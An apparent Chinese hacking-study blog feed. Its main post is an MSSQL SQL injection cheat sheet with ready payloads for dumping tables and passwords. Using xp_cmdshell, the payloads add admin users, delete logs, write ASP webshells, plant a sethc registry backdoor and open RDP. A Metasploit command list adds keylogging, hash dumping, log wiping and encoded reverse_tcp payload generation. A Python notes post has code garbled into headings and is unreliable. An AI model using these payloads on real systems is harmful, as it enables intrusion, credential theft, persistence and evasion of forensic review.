<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://itxz.fun</id>
    <title>pony686</title>
    <updated>2020-09-06T04:53:06.458Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://itxz.fun"/>
    <link rel="self" href="https://itxz.fun/atom.xml"/>
    <subtitle>pony686</subtitle>
    <logo>https://itxz.fun/images/avatar.png</logo>
    <icon>https://itxz.fun/favicon.ico</icon>
    <rights>All rights reserved 2020, pony686</rights>
    <entry>
        <title type="html"><![CDATA[sql注入]]></title>
        <id>https://itxz.fun/post/sql-zhu-ru/</id>
        <link href="https://itxz.fun/post/sql-zhu-ru/">
        </link>
        <updated>2020-09-06T01:40:17.000Z</updated>
        <content type="html"><![CDATA[<p>判断语句<br>
1.判断是否有注入<br>
and 1=1<br>
and 1=2<br>
/<br>
-0<br>
判断注入的方法是一样的<br>
2.初步判断是否是mssql<br>
and user&gt;0<br>
3.判断数据库系统<br>
and (select count(<em>) from sysobjects)&gt;0 mssql<br>
and (select count(</em>) from msysobjects)&gt;0 access</p>
<p>注入语句<br>
4.注入参数是字符<br>
'and [查询条件] and ''='<br>
5.搜索时没过滤参数的<br>
'and [查询条件] and '%25'='<br>
6.猜数表名<br>
and (select Count(*) from [表名])&gt;0<br>
7.猜字段<br>
and (select Count(字段名) from 表名)&gt;0<br>
8.猜字段中记录长度<br>
and (select top 1 len(字段名) from 表名)&gt;0<br>
9.(1)猜字段的ascii值（access）<br>
and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0<br>
(2)猜字段的ascii值（mssql）<br>
and (select top 1 unicode(substring(字段名,1,1)) from 表名)&gt;0</p>
<p>实例：探测漏洞信息<br>
http://testasp.vulnweb.com/showforum.asp?id=0<br>
在加入'后 报错<br>
//数据库版本<br>
id=1 and 1=(select @@version)<br>
//当前使用的数据库<br>
id=1 and 1=(select db_name())</p>
<p>实例：列数据库名称<br>
//获取第一个用户数据库<br>
and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)<br>
and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name&lt;&gt; 'acublog')<br>
//以此类推，可以获取全部用户数据库名<br>
and 1=(select name from master..sysdatabases for xml path)</p>
<p>实例：列表名<br>
//获取表名<br>
//获取第一张表 threads<br>
?id=1 and 1=(select top 1 name from sysobjects where xtype='u')<br>
//获取第二张表 users<br>
?id=1 and 1=(select top 1 name from sysobjects where xtype='U' and name &lt;&gt; 'threads' )<br>
//以此类推，可以获取全部表</p>
<p>实例：列表的列名<br>
获取表 users 的列名<br>
//获取第一列列名 uname<br>
?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users'))<br>
//获取第二列列名 upass<br>
?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users') and name &lt;&gt; 'uname' )</p>
<p>实例：列数据<br>
//获取第一个用户名<br>
?id=1 and 1=(select top 1 uname from users)<br>
//获取第一个用户名对应的密码<br>
?id=1 and 1=(select top 1 upass from users )</p>
<p>union 联合查询<br>
顺便查下版本和数据库名<br>
union select null,@@version,db_name(),null,null</p>
<p>如果要查其他数据库的表名还可以这样:<br>
union select  null,(select top 1 name from [dbname]..sysobjects where xtype='u' and name not in(select top 0 name from [dbname]..sysobjects where xtype='u')),null,null</p>
<p>union 列表名</p>
<p>继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)<br>
第一个表名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
第二个表名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name='password'))),null</p>
<p>union 列列名<br>
继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)<br>
第一个列名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
第二个列名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
第三个列名</p>
<p>http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name='password'))),null</p>
<p>列数据<br>
http://192.168.0.240:8005/?id=1   union select null,username,password  from password where username not in (select top 0 username from password)</p>
<p>PART 3:  SqlServer不同权限利用<br>
用户所处权限分析：</p>
<p>sa权限<br>
dbo<br>
public</p>
<p>权限判断语句<br>
and 1=(select is_srvrolemember('sysadmin')) //判断是否是系统管理员<br>
and 1=(select is_srvrolemember('db_owner')) //判断是否是库权限<br>
and 1=(select is_srvrolemember('public'))   //判断是否为public权限<br>
and 1=convert(int,db_name())或1=(select db_name())  //当前数据库名<br>
and 1=(select @@servername)  //本地服务名<br>
and 1=(select HAS_DBACCESS('master'))  //判断是否有库读取权限</p>
<p>Sa权限的利用<br>
注入用户密码<br>
修改网站管理员密码<br>
直接getshell<br>
调用系统命令<br>
创建系统管理员<br>
操控文件<br>
操控日志文件<br>
getshell<br>
创建sqlserver管理<br>
系统服务操作<br>
注册表操作<br>
创建后门<br>
开启3389</p>
<p>SQLserver中的存储过程<br>
<img src="https://itxz.fun/post-images/1599357937450.png" alt="" loading="lazy"></p>
<p>修改网站管理员密码<br>
;update admin set pass=‘e8dc763194f29433’ where admin=‘cracer’<br>
将管理员表admin中admin用户的密码设置为e8dc763194f29433</p>
<p>修改之前把原来密码备份<br>
通常在密码解不出的情况下选择使用该方法</p>
<p>直接getshell<br>
修复上传<br>
;EXEC sp_configure 'show advanced options',1;<br>
RECONFIGURE;<br>
;exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE</p>
<p>http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27C:\Inetpub\wwwroot\8005\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--</p>
<p>调用系统命令xp_cmdshell<br>
1.检测与恢复扩展存储<br>
判断xp_cmdshell扩展存储是否存在<br>
and 1=(select count(<em>) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell')<br>
判断xp_regread扩展存储过程是否存在<br>
and 1=(select count(</em>) from master.dbo.sysobjects where name='xp_regread')<br>
恢复<br>
;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br>
;exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'</p>
<p>Xp_cmdshell执行命令</p>
<p>新建用户<br>
;exec master..xp_cmdshell 'net user test test /add'<br>
;exec master..xp_cmdshell 'net localgroup administrators test /add'<br>
操控日志<br>
;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5\ex070606.log '<br>
Getshell<br>
echo <sup>&lt;%Execute(request(&quot;a&quot;))%</sup>&gt; &gt; d:\www\123.asp<br>
;exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=&quot;Jscript&quot;%<sup>&gt;</sup>&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\WWW\233.aspx' ;--<br>
操作注册表<br>
删除注册表<br>
reg delete HKLM\SOFTWARE\McAfee /f<br>
导入注册表<br>
Regedit /s d:\web\zh\hp.reg<br>
导出注册表<br>
regedit /e d:\web\zhao\aaa.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Wds\rdpwd\Tds\tcp&quot;</p>
<p>创建sqlserver管理<br>
添加和删除一个SA权限的用户test：（需要SA权限）<br>
exec master.dbo.sp_addlogin test,password<br>
exec master.dbo.sp_addsrvrolemember test,sysadmin</p>
<p>系统服务操作<br>
停掉或激活某个服务。 （需要SA权限）<br>
exec master..xp_servicecontrol 'stop','schedule'<br>
exec master..xp_servicecontrol 'start','schedule'</p>
<p>注册表操作<br>
启用存储过程<br>
exec sp_addextendedproc xp_regread,'xpstar.dll'<br>
;exec master.dbo.sp_addextendedproc0x780070005f007200650067007200650061006400,0x7800700073007400610072002e0064006c006c00—</p>
<p>exec sp_addextendedproc xp_regwrite,'xpstar.dll'</p>
<p>xp_regwrite 根键,子键, 值名, 值类型, 值<br>
exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_SZ','c:\windows\system32\cmd.exe'</p>
<p>写入shift后门<br>
exec xp_regwrite<br>
0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,'c:\windows\system32\taskmgr.exe'--</p>
<p>开启3389<br>
;exec master..xp_cmdshell 'sc config termservice start=auto'<br>
;exec master..xp_cmdshell 'net start termservice'<br>
;exec master..xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'<br>
//允许外部连接<br>
;exec master..xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal<br>
Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f'    //改端口到80<br>
开启3389<br>
;exec master..xp_cmdshell &quot;wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1&quot;--</p>
<p>dbowner权限利用<br>
1.判断数据库用户权限<br>
and 1=(select is_member('db_owner'));--<br>
2.搜索web目录<br>
;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--<br>
然后<br>
;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1--<br>
and(select dir from temp where id=1)&gt;0<br>
由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹</p>
<p>getshell<br>
找到web目录后，就可以写入一句话木马了<br>
;alter database ssdown5 set RECOVERY FULL<br>
;create table test(str image)--<br>
;backup log ssdown5 to disk='c:\test' with init--<br>
;insert into test(str)values ('&lt;%excute(request(&quot;cmd&quot;))%&gt;')--<br>
;backup log ssdown5 to disk='c:\inetpub\wwwroot\x.asp'--<br>
;alter database ssdown5 set RECOVERY simple</p>
<p>PART 4:  SqlServer 工具使用<br>
穿山甲、萝卜头、sqlmap等</p>
<p>掌握sqlserver常用操作<br>
了解sqlserver 手工注入<br>
学会挖掘注入和利用工具使用</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集01]]></title>
        <id>https://itxz.fun/post/xin-xi-shou-ji-01/</id>
        <link href="https://itxz.fun/post/xin-xi-shou-ji-01/">
        </link>
        <updated>2020-06-15T11:16:32.000Z</updated>
        <content type="html"><![CDATA[<p>第一步：域名探测</p>
<p>第二步：子域名探测</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Metasploit 常用渗透命令大全]]></title>
        <id>https://itxz.fun/post/metasploit-chang-yong-shen-tou-ming-ling-da-quan/</id>
        <link href="https://itxz.fun/post/metasploit-chang-yong-shen-tou-ming-ling-da-quan/">
        </link>
        <updated>2020-06-13T03:25:06.000Z</updated>
        <content type="html"><![CDATA[<p>show exploits<br>
列出metasploit框架中的所有渗透攻击模块。<br>
show payloads<br>
列出metasploit框架中的所有攻击载荷。<br>
show auxiliary<br>
列出metasploit框架中的所有辅助攻击载荷。<br>
search name<br>
查找metasploit框架中所有的渗透攻击和其他模块。<br>
info<br>
展示出制定渗透攻击或模块的相关信息。<br>
use name<br>
装载一个渗透攻击或模块。</p>
<p>LHOST<br>
你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。<br>
RHOST<br>
远程主机或是目标主机。<br>
set function<br>
设置特定的配置参数（EG：设置本地或远程主机参数）。<br>
setg function<br>
以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。<br>
show options<br>
列出某个渗透攻击或模块中所有的配置参数。<br>
show targets<br>
列出渗透攻击所有支持的目标平台。<br>
set target num<br>
指定你所知道的目标的操作系统以及补丁版本类型。<br>
set payload name<br>
指定想要使用的攻击载荷。<br>
show advanced<br>
列出所有高级配置选项。<br>
set autorunscript migrate -f.<br>
在渗透攻击完成后，将自动迁移到另一个进程。<br>
check<br>
检测目标是否选定渗透攻击存在相应的安全漏洞。<br>
exploit<br>
执行渗透攻击或模块来攻击目标。<br>
exploit -j<br>
在计划任务下进行渗透攻击（攻击将在后台进行）。<br>
exploit -z<br>
渗透攻击完成后不与回话进行交互。<br>
exploit -e encoder<br>
制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。<br>
exploit -h<br>
列出exploit命令的帮助信息。<br>
sessions -l<br>
列出可用的交互会话（在处理多个shell时使用）。<br>
sessions -l -v<br>
列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。<br>
sessions -s script<br>
在所有活跃的metasploit会话中运行一个特定的metasploit脚本。<br>
sessions -K<br>
杀死所有活跃的交互会话。<br>
sessions -c cmd<br>
在所有活跃的metasploit会话上执行一个命令。<br>
sessions -u sessionID<br>
升级一个普通的win32 shell到metasploit shell。<br>
db_create name<br>
创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。<br>
db_connect name<br>
创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。<br>
db_namp<br>
利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。<br>
db_autopwn -h<br>
展示出db_autopwn命令的帮助信息。<br>
db_autopwn -p -r -e<br>
对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>
db_destroy<br>
删除当前数据库。<br>
db_destroy user：passwd@host：port/database<br>
使用高级选项来删除数据库。<br>
metasploit命令<br>
help<br>
打开meterpreter使用帮助。<br>
run scriptname<br>
运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。<br>
sysinfo<br>
列出受控主机的系统信息。<br>
ls<br>
列出目标主机的文件和文件夹信息。<br>
use priv<br>
加载特权提升扩展模块，来扩展metasploit库。<br>
ps<br>
显示所有运行的进程以及相关联的用户账户。<br>
migrate PID<br>
迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。<br>
use incognito<br>
加载incognito功能（用来盗窃目标主机的令牌或假冒用户）<br>
list_tokens -u<br>
列出目标主机用户的可用令牌。<br>
list_tokens -g<br>
列出目标主机用户组的可用令牌。<br>
impersonate_token DOMAIN_NAME\USERNAME<br>
假冒目标主机上的可用令牌。<br>
steal_token PID<br>
盗窃给定进程的可用令牌并进行令牌假冒。<br>
drop_token<br>
停止假冒当前令牌。<br>
getsystem<br>
通过各种攻击向量来提升系统用户权限。<br>
execute -f cmd.exe -i<br>
执行cmd.exe命令并进行交互。<br>
execute -f cmd.exe -i -t<br>
以所有可用令牌来执行cmd命令并隐藏该进程。<br>
rev2self<br>
回到控制目标主机的初始用户账户下。<br>
reg command<br>
在目标主机注册表中进行交互，创建，删除，查询等操作。<br>
setdesktop number<br>
切换到另一个用户界面（该功能基于那些用户已登录）。<br>
screenshot<br>
对目标主机的屏幕进行截图。<br>
upload file<br>
向目标主机上传文件。<br>
download file<br>
从目标主机下载文件。<br>
keyscan_start<br>
针对远程目标主机开启键盘记录功能。<br>
keyscan_dump<br>
存储目标主机上捕获的键盘记录。<br>
keyscan_stop<br>
停止针对目标主机的键盘记录。<br>
getprivs<br>
尽可能多的获取目标主机上的特权。<br>
uictl enable keyboard/mouse<br>
接管目标主机的键盘和鼠标。<br>
background<br>
将你当前的metasploit shell转为后台执行。<br>
hashdump<br>
导出目标主机中的口令哈希值。<br>
use sniffer<br>
加载嗅探模式。<br>
sniffer_interfaces<br>
列出目标主机所有开放的网络端口。<br>
sniffer_dump interfaceID pcapname<br>
在目标主机上启动嗅探。<br>
sniffer_start interfaceID packet-buffer<br>
在目标主机上针对特定范围的数据包缓冲区启动嗅探。<br>
sniffer_stats interfaceID<br>
获取正在实施嗅探网络接口的统计数据。<br>
sniffer_stop interfaceID<br>
停止嗅探。<br>
add_user username password -h ip<br>
在远程目标主机上添加一个用户。<br>
clearev<br>
清楚目标主机上的日志记录。<br>
timestomp<br>
修改文件属性，例如修改文件的创建时间（反取证调查）。<br>
reboot<br>
重启目标主机。<br>
MSFpayload命令<br>
msfpayload -h<br>
msfpayload的帮助信息。<br>
msfpayload windows/meterpreter/bind_tcp O<br>
列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。<br>
msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>
创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。<br>
msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>
创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。<br>
msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>
创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。<br>
msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>
创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。<br>
msfencode命令<br>
mefencode -h<br>
列出msfencode的帮助命令。<br>
msfencode -l<br>
列出所有可用的编码器。<br>
msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>
显示编码缓冲区的格式。<br>
msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>
使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。<br>
msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>
创建一个经过多种编码格式嵌套编码的攻击载荷。<br>
msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c<br>
创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。<br>
MSFcli命令<br>
msfcli | grep exploit<br>
仅列出渗透攻击模块。<br>
msfcli | grep exploit/windows<br>
仅列出与windows相关的渗透攻击模块。<br>
msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>
对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day07]]></title>
        <id>https://itxz.fun/post/day07/</id>
        <link href="https://itxz.fun/post/day07/">
        </link>
        <updated>2020-04-23T04:41:40.000Z</updated>
        <content type="html"><![CDATA[<p>01 今日内容大纲</p>
<ol>
<li>基础数据类型的补充</li>
<li>数据类型之间的转换</li>
<li>编码的进阶<br>
02 昨日内容回顾以及作业讲解</li>
<li>id == is：<br>
== ：数值是否相同 is：内存地址，id 获取对象的内存地址</li>
<li>代码块：一个文件，交互式命令一行就是一个代码块。</li>
<li>同一代码块下缓存机制（字符串驻留机制）：<br>
所有数字，bool 几乎所有的字符串<br>
优点：提升性能，节省内存空间。</li>
<li>不同代码块的缓存机制（小数据池）：在内存中开辟两个空间，一个空间存储-5~256的int，一个空间存储一定<br>
规则的字符串，如果你的代码中遇到了满足条件的数据，直接引用提前创建的。<br>
-5~256 int，bool，满足一定规则的字符串。<br>
优点：提升性能，节省内存空间。</li>
<li>集合：列表去重，关系测试 交并差。</li>
<li>深浅copy：<br>
浅copy：在内存中开辟一个新的空间存放copy的对象（列表，字典），但是里面的所有元素与被copy对象<br>
的里面的元素共用一个。<br>
03 具体内容<br>
数据类型的补充<br>
str</li>
</ol>
<h1 id="str-补充的方法练习一遍就行">str ：补充的方法练习一遍就行。</h1>
<h1 id="s1-taibai">s1 = 'taiBAi'</h1>
<h1 id="capitalize-首字母大写其余变小写">capitalize 首字母大写，其余变小写</h1>
<h1 id="prints1capitalize">print(s1.capitalize())</h1>
<h1 id="swapcase-大小写翻转">swapcase 大小写翻转</h1>
<h1 id="prints1swapcase">print(s1.swapcase())</h1>
<h1 id="title">title</h1>
<h1 id="msg-taibai-say3hi">msg= 'taibai say3hi'</h1>
<h1 id="printmsgtitle-每个单词的首字母大写">print(msg.title()) #每个单词的首字母大写</h1>
<p>元组<br>
列表<br>
s1 = 'barry'</p>
<h1 id="居中">居中</h1>
<h1 id="prints1center20">print(s1.center(20))</h1>
<h1 id="prints1center20-2">print(s1.center(20,'*'))</h1>
<h1 id="find-通过元素找索引找到第一个就返回找不到-返回-1">find :通过元素找索引，找到第一个就返回，找不到 返回-1</h1>
<h1 id="index通过元素找索引找到第一个就返回找不到-报错">index:通过元素找索引，找到第一个就返回，找不到 报错</h1>
<h1 id="prints1finda">print(s1.find('a'))</h1>
<h1 id="prints1findr">print(s1.find('r'))</h1>
<h1 id="prints1findo">print(s1.find('o'))</h1>
<h1 id="prints1indexo">print(s1.index('o'))</h1>
<h1 id="tuple">tuple</h1>
<h1 id="元组中如果只有一个元素并且没有逗号那么它不是元组它与改元素的数据类型一致">元组中如果只有一个元素，并且没有逗号，那么它不是元组，它与改元素的数据类型一致。 ***</h1>
<h1 id="tu1-234">tu1 = (2,3,4)</h1>
<h1 id="tu1-2">tu1 = (2)</h1>
<h1 id="tu1-太白">tu1 = ('太白')</h1>
<h1 id="tu1-123">tu1 = ([1,2,3])</h1>
<h1 id="tu1-1">tu1 = (1,)</h1>
<h1 id="printtu1typetu1">print(tu1,type(tu1))</h1>
<h1 id="tu-12333223">tu = (1,2,3,3,3,2,2,3,)</h1>
<h1 id="count-计数"># count 计数</h1>
<h1 id="printtucount3">print(tu.count(3))</h1>
<h1 id="tu-太白-日天-太白">tu = ('太白', '日天', '太白')</h1>
<h1 id="index"># index</h1>
<h1 id="printtuindex太白">print(tu.index('太白'))</h1>
<h1 id="l1-太白-123-女神-大壮">l1 = ['太白', '123', '女神', '大壮']</h1>
<h1 id="count-pass">count pass</h1>
<h1 id="index-2">index</h1>
<h1 id="printl1index大壮">print(l1.index('大壮'))</h1>
<h1 id="sort">sort **</h1>
<h1 id="l1-5-4-3-7-8-6-1-9">l1 = [5, 4, 3, 7, 8, 6, 1, 9]</h1>
<h1 id="l1sort-默认从小到大排序"># l1.sort() # 默认从小到大排序</h1>
<h1 id="l1sortreversetrue-从大到小排序"># l1.sort(reverse=True) # 从大到小排序 **</h1>
<h1 id="l1reverse-反转">l1.reverse() # 反转 **</h1>
<h1 id="printl1">print(l1)</h1>
<h1 id="列表可以相加">列表可以相加</h1>
<h1 id="l1-1-2-3">l1 = [1, 2, 3]</h1>
<h1 id="l2-1-2-3-太白-123-女神">l2 = [1, 2, 3, '太白', '123', '女神']</h1>
<h1 id="printl1-l2">print(l1 + l2)</h1>
<h1 id="列表与数字相乘">列表与数字相乘</h1>
<h1 id="l1-1-daf-3">l1 = [1, 'daf', 3]</h1>
<h1 id="l2-l13">l2 = l1*3</h1>
<h1 id="printl2">print(l2)</h1>
<p>字典<br>
l1 = [11, 22, 33, 44, 55]</p>
<h1 id="索引为奇数对应的元素删除不能一个一个删除此l1只是举个例子里面的元素不定">索引为奇数对应的元素删除（不能一个一个删除，此l1只是举个例子，里面的元素不定）。</h1>
<h1 id="重要">*** 重要</h1>
<h1 id="正常思路">正常思路：</h1>
<h1 id="先将所有的索引整出来">先将所有的索引整出来。</h1>
<h1 id="加以判断index-2-1-popindex"># 加以判断，index % 2 == 1： pop（index）</h1>
<h1 id="for-index-in-rangelenl1">for index in range(len(l1)):</h1>
<h1 id="if-index-2-1">if index % 2 == 1:</h1>
<h1 id="l1popindex">l1.pop(index)</h1>
<h1 id="printl1-2">print(l1)</h1>
<h1 id="列表的特性">列表的特性：</h1>
<h1 id="l1-11-22-33-44-55">l1 = [11, 22, 33, 44, 55]</h1>
<h1 id="最简单的">最简单的：</h1>
<h1 id="del-l112">del l1[1::2]</h1>
<h1 id="printl1-3">print(l1)</h1>
<h1 id="l1-11-22-33-44-55-2">l1 = [11, 22, 33, 44, 55]</h1>
<h1 id="倒序法删除元素"># 倒序法删除元素</h1>
<h1 id="for-index-in-rangelenl1-1-1-1">for index in range(len(l1)-1,-1,-1):</h1>
<h1 id="if-index-2-1-2">if index % 2 == 1:</h1>
<h1 id="l1popindex-2">l1.pop(index)</h1>
<h1 id="printl1-4">print(l1)</h1>
<h1 id="思维置换">思维置换</h1>
<h1 id="l1-11-22-33-44-55-3">l1 = [11, 22, 33, 44, 55]</h1>
<h1 id="new_l1">new_l1 = []</h1>
<h1 id="for-index-in-rangelenl1-2">for index in range(len(l1)):</h1>
<h1 id="if-index-2-0">if index % 2 ==0:</h1>
<h1 id="new_l1appendl1index">new_l1.append(l1[index])</h1>
<h1 id="printnew_l1"># print(new_l1)</h1>
<h1 id="l1-new_l1">l1 = new_l1</h1>
<h1 id="printl1-5">print(l1)</h1>
<h1 id="循环一个列表的时最好不要改变列表的大小这样会影响你的最终的结果">循环一个列表的时，最好不要改变列表的大小，这样会影响你的最终的结果。</h1>
<h1 id="字典的补充">字典的补充</h1>
<h1 id="update">update ***</h1>
<h1 id="dic-name-太白-age-18">dic = {'name': '太白', 'age': 18}</h1>
<h1 id="dicupdatehobby运动-hight175"># dic.update(hobby='运动', hight='175')</h1>
<h1 id="dicupdatename太白金星"># dic.update(name='太白金星')</h1>
<h1 id="dicupdate1-a2-b3-c4-d-面试会考">dic.update([(1, 'a'),(2, 'b'),(3, 'c'),(4, 'd')]) # 面试会考</h1>
<h1 id="printdic">print(dic)</h1>
<h1 id="dic1-namejinage18sexmale">dic1 = {&quot;name&quot;:&quot;jin&quot;,&quot;age&quot;:18,&quot;sex&quot;:&quot;male&quot;}</h1>
<h1 id="dic2-namealexweight75">dic2 = {&quot;name&quot;:&quot;alex&quot;,&quot;weight&quot;:75}</h1>
<h1 id="dic1updatedic2-更新有则覆盖无责添加">dic1.update(dic2) # 更新，有则覆盖，无责添加</h1>
<h1 id="printdic1-name-alex-age-18-sex-male-weight-75">print(dic1) # {'name': 'alex', 'age': 18, 'sex': 'male', 'weight': 75}</h1>
<h1 id="printdic2">print(dic2)</h1>
<p>数据类型的转换<br>
数据类型的分类（了解）<br>
编码的进阶<br>
ASCII码：包含英文字母，数字，特殊字符与01010101对应关系。<br>
a 01000001 一个字符一个字节表示。<br>
GBK：只包含本国文字（以及英文字母，数字，特殊字符）与0101010对应关系。<br>
a 01000001 ascii码中的字符：一个字符一个字节表示。<br>
中 01001001 01000010 中文：一个字符两个字节表示。<br>
Unicode：包含全世界所有的文字与二进制0101001的对应关系。<br>
a 01000001 01000010 01000011 00000001<br>
b 01000001 01000010 01100011 00000001</p>
<h1 id="fromkeys">fromkeys</h1>
<h1 id="dic-dictfromkeysabc-100">dic = dict.fromkeys('abc', 100)</h1>
<h1 id="dic-dictfromkeys1-2-3-alex">dic = dict.fromkeys([1, 2, 3], 'alex')</h1>
<h1 id="坑值共有一个面试题">坑：值共有一个,面试题</h1>
<h1 id="dic-dictfromkeys123">dic = dict.fromkeys([1,2,3],[])</h1>
<h1 id="dic1append666">dic[1].append(666)</h1>
<h1 id="printdic-2">print(dic)</h1>
<p>dic = {'k1': '太白', 'k2': 'barry', 'k3': '白白', 'age': 18}</p>
<h1 id="将字典中键含有k元素的键值对删除">将字典中键含有'k'元素的键值对删除。</h1>
<h1 id="for-key-in-dic">for key in dic:</h1>
<h1 id="if-k-in-key">if 'k' in key:</h1>
<h1 id="dicpopkey">dic.pop(key)</h1>
<h1 id="printdic-3">print(dic)</h1>
<h1 id="循环一个字典时如果改变这个字典的大小就会报错">循环一个字典时，如果改变这个字典的大小，就会报错。</h1>
<h1 id="l1">l1 = []</h1>
<h1 id="for-key-in-dic-2">for key in dic:</h1>
<h1 id="if-k-in-key-2">if 'k' in key:</h1>
<h1 id="l1appendkey">l1.append(key)</h1>
<h1 id="printl1-6">print(l1)</h1>
<h1 id="for-i-in-l1">for i in l1:</h1>
<h1 id="dicpopi">dic.pop(i)</h1>
<h1 id="printdic-4">print(dic)</h1>
<h1 id="for-key-in-listdickeys-k1-k2-k3age">for key in list(dic.keys()): # ['k1', 'k2', 'k3','age']</h1>
<h1 id="if-k-in-key-3">if 'k' in key:</h1>
<h1 id="dicpopkey-2">dic.pop(key)</h1>
<h1 id="printdic-5">print(dic)</h1>
<h1 id="0setnone-转换成bool值为false">0,''(),[],{},set(),None 转换成bool值为False</h1>
<p>中 01001001 01000010 01100011 00000001<br>
UTF-8:包含全世界所有的文字与二进制0101001的对应关系（最少用8位一个字节表示一个字符）。<br>
a 01000001 ascii码中的字符：一个字符一个字节表示。<br>
To 01000001 01000010 (欧洲文字：葡萄牙，西班牙等)一个字符两个字节表示。<br>
中 01001001 01000010 01100011 亚洲文字；一个字符三个字节表示。</p>
<ol>
<li>不同的密码本之间能否互相识别？不能。</li>
<li>数据在内存中全部是以Unicode编码的，但是当你的数据用于网络传输或者存储到硬盘中，必须是以非<br>
Unicode编码（utf-8,gbk等等）。<br>
